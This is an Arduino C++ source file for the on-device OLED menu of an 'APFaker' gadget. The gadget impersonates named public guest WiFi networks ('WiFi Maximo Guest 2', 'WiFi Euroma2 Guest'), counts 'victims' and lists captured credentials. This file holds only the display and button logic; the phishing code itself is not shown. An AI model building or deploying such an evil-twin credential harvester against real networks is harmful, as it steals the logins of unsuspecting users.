#include <Adafruit_GFX.h>
#include <Adafruit_GrayOLED.h>
#include <Adafruit_SPITFT.h>
#include <Adafruit_SPITFT_Macros.h>
#include <gfxfont.h>

#include <Adafruit_SSD1306.h>
#include <splash.h>

#include "APFaker.h"

#define size_of_Array(x)   (sizeof(x) / sizeof(*x))

/**********************************
 * Button available on the device
 * The central button can be used to 
 * confirm selected action or come 
 * back to the previous screen
 */
enum ACTIONS {
  ACT_NONE = 0,
  ACT_UP,
  ACT_CONFIRM,
  ACT_DOWN
};

/********************************************************
 * Flow control of the device:
 * 1. HOME:   It's the initial status and the device 
 *            allow to select the AP to emulate
 * 2. ACTIVE: The faker AP is selected the possible 
 *            actions are:
 *              * stop the AP
 *              * show the status of the activities
 *              * show the credentials obtained 
 * 3. STATUS: It show the :
 *              * number of victims
 *              * number of current connected client
 *              * number of total connection received
 * 4. RESULT: It show the list of credentials recorded 
 *            until now.
 */
enum SCREENS {
  HOME_SCREEN = 0,
  ACTIVE_SCREEN,
  STATUS_SCREEN,
  RESULT_SCREEN,
  TOTAL_SCREENS
} currentScreen;

/**********************************
 * First title of each screen
 */
String DisplaysTitles[TOTAL_SCREENS] = {
  "-Chose AP-",
  "-AP Active-",
  "-Status-",
  "-Record-"
};

/*****************************************
 * Available Faker AP listed in the HOME
 */
APFakerStruct AvailableAP[2] = {
  { "Maximo", "WiFi Maximo Guest 2", "", 0 },
  { "Euroma2", "WiFi Euroma2 Guest", "", 0 }
};

/**********************************
 * Actions available for the screen
 * with the AP active
 */
String ActiveActions[3] = {
  "Stop AP",
  "Status",
  "Records"
};

/**********************************
 * List of the metrics to show in 
 * the Status screen
 */
String StatusMetrics[3] = {
  " victim/s",
  " client/s",
  " total"
};

/**********************************
 * Each screen will show the nth element 
 * of his relative own array in the second 
 * line of the LCD display; this variable 
 * will keep the index of the record shown
 */
unsigned int actualLine = 0;

/**********************************
 * If the scrollActive variable is true
 * this set of variable allow to scroll 
 * the second line horizontally, in order 
 * to show the entire text
 */
int actualPos = 0;
int endOfLine = 0;
int adder = -1;
bool scrollActive = false;
unsigned long myTimeStart, myTimeStop;

/**********************************
 * Initialization of the display */
Adafruit_SSD1306 display = Adafruit_SSD1306(128, 32);

void DrawDisplay(String rowOne, String rowTwo){
  /******************************************
   * Set of istructions that draw the first 
   * and the second row on the screen on 
   * the display
   */
  display.clearDisplay();
  display.display();
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.print(rowOne);
  display.setCursor(actualPos,17);
  display.print(rowTwo);
  display.setCursor(0,0);
  display.display();
}

/**********************************
 * The UpdateDisplay function manage the and draw the 
 * display with the information relative the specific 
 * screen and the relative array at own assigned
 */
void UpdateDisplay(){
  String ElementLine2 = "";
  String SectionTitle = DisplaysTitles[(int)currentScreen];
  switch(currentScreen){
    case HOME_SCREEN:
      ElementLine2 = AvailableAP[actualLine % size_of_Array(AvailableAP)].shortName;
      break;
    case ACTIVE_SCREEN:
      ElementLine2 = ActiveActions[actualLine % size_of_Array(ActiveActions)];
      break;
    case STATUS_SCREEN:
      ElementLine2 = String(MetricsData[actualLine % MTR_MAX_ELEM]) + StatusMetrics[actualLine % MTR_MAX_ELEM];
      break;
    case RESULT_SCREEN:
      if (MetricsData[MTR_VICTIMS] > 0)
        ElementLine2 = ResultList[actualLine % MetricsData[MTR_VICTIMS]];
      else
        ElementLine2 = "NO records!";
      break;
    default:
      /************************************************
       * An unexpected SCREEN provide an unknow ERROR
       * that the device is unable to resolve
       */
      ElementLine2 = "ERROR!!!";
      break;
  }

  DrawDisplay(SectionTitle, ElementLine2);
}

void setupDisplay()
{
  // SSD1306_SWITCHCAPVCC = generate display voltage from 3.3V internally
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C); // Address 0x3C for 128x32
  // Show image buffer on the display hardware.
  // Since the buffer is intialized with an Adafruit splashscreen
  // internally, this will display the splashscreen.
  display.display();
  delay(3000);
  currentScreen = HOME_SCREEN;
  // UpdateDisplay();
  myTimeStart = millis();
}

void Activate(){
  switch(currentScreen){
    case HOME_SCREEN:
      DrawDisplay("-WORKING-", "Creating AP!");
      if (InitializationAP(AvailableAP[actualLine % size_of_Array(AvailableAP)]) != CS_SUCCESS){
        DrawDisplay("-ERROR-", "Creating AP failed!");
        Logger::WriteLog(LOG_ERROR, "Creating AP failed!");
        delay(5000);
        return;
      }
      StartSDActivity();
      currentScreen = ACTIVE_SCREEN;
      break;
    case ACTIVE_SCREEN:
      switch(actualLine % size_of_Array(ActiveActions)){
        case 0:   // "Stop AP"
          StopAP();
          StopSDActivity();
          currentScreen = HOME_SCREEN;
          break;
        case 1:   // "Status"
          Logger::WriteLog(LOG_INFO, "Switching on status!");
          currentScreen = STATUS_SCREEN;
          break;
        case 2:   // "Records"
          Logger::WriteLog(LOG_INFO, "Switching on records!");
          currentScreen = RESULT_SCREEN;
          break;
        default:
          break;
      }
      break;
    case STATUS_SCREEN:
    case RESULT_SCREEN:
      currentScreen = ACTIVE_SCREEN;
      break;
    default:
      break;
  }
}

void displayLoop(ACTIONS action) {
  /******************************************
   * This block of code provide the scroll of 
   * the second row drawed in the display.
   * The native function for the scroll of the 
   * displayinside the Adafruit library was not 
   * used for two reasons:
   *  - the scroll involve the entire screen 
   *    (both the rows)
   *  - the use of the native function block 
   *    the process until the scroll is completed
   */
  myTimeStop = millis();
  if (scrollActive && myTimeStop - myTimeStart > 100)
  {
    actualPos += adder;
    UpdateDisplay();
    if (!display.getPixel(120, 28))
      endOfLine++;
    else
      endOfLine = 0;
    if (endOfLine >= 50 || actualPos > 0)
    {
      endOfLine = 0;
      adder = -(adder);
    }
    myTimeStart = myTimeStop;
  }

  /******************************************
   * Do action based on the button pressed */
  switch (action) {
    case ACT_UP:
      Logger::WriteLog(LOG_DEBUG, "UP button pressed!");
      actualLine--;
      break;
    case ACT_CONFIRM:
      Logger::WriteLog(LOG_DEBUG, "CONFIRM button pressed!");
      Activate();
      actualLine = 0;
      break;
    case ACT_DOWN:
      Logger::WriteLog(LOG_DEBUG, "DOWN button pressed!");
      actualLine++;
      break;
    default:
      if (currentAPFaker != emptyAPFaker)
      {
        CheckForNewDevices();
        APFakerClientLoopManager();
      }
      return;
      break;
  }
  UpdateDisplay();
}
